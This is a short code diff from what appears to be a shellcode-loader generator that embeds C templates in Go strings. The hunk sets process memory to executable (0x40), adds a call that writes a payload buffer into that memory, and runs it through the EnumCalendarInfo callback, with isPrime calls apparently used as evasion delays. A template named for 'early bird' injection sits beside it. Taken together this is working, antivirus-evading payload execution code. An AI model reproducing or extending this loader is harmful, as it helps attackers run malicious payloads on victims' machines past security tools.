@@ -25,6 +25,7 @@ var __c__syscall_callback = `
 	isPrime(1000000000000002049);
     VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
 	isPrime(1000000000000002049);
+	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
 var __c__syscall__earlyBird = `
